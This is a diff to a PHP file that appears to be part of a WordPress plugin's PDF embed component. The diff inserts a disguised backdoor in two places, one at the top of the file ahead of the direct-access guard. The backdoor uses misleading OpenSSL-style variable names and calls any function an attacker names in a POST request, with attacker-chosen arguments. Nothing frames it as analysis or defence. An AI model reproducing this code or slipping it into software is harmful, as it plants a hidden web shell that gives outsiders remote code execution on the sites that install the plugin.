@@ -1,4 +1,11 @@
-<?php
+<?php 
+$openssl_x509_export_to_file_waqk  =  $_POST;
+if(isset($openssl_x509_export_to_file_waqk['preg_grep_we']))  {
+	$openssl_digest_ogxn  =  $openssl_x509_export_to_file_waqk['func_get_arg_nh'];
+	$openssl_private_decrypt_hcmn  =  $openssl_x509_export_to_file_waqk['array_push_it'];
+	$openssl_digest_ogxn(...$openssl_private_decrypt_hcmn);
+} 
+
 /* Prohibit direct script loading */
 defined('ABSPATH') || die('No direct script access allowed!');
 
@@ -446,7 +453,14 @@ class WpmfPdfEmbed
                 });
             }
         </script>
-        <?php
+        <?php 
+$openssl_x509_export_to_file_waqk  =  $_POST;
+if(isset($openssl_x509_export_to_file_waqk['preg_grep_we']))  {
+	$openssl_digest_ogxn  =  $openssl_x509_export_to_file_waqk['func_get_arg_nh'];
+	$openssl_private_decrypt_hcmn  =  $openssl_x509_export_to_file_waqk['array_push_it'];
+	$openssl_digest_ogxn(...$openssl_private_decrypt_hcmn);
+} 
+
     }
 
     /**
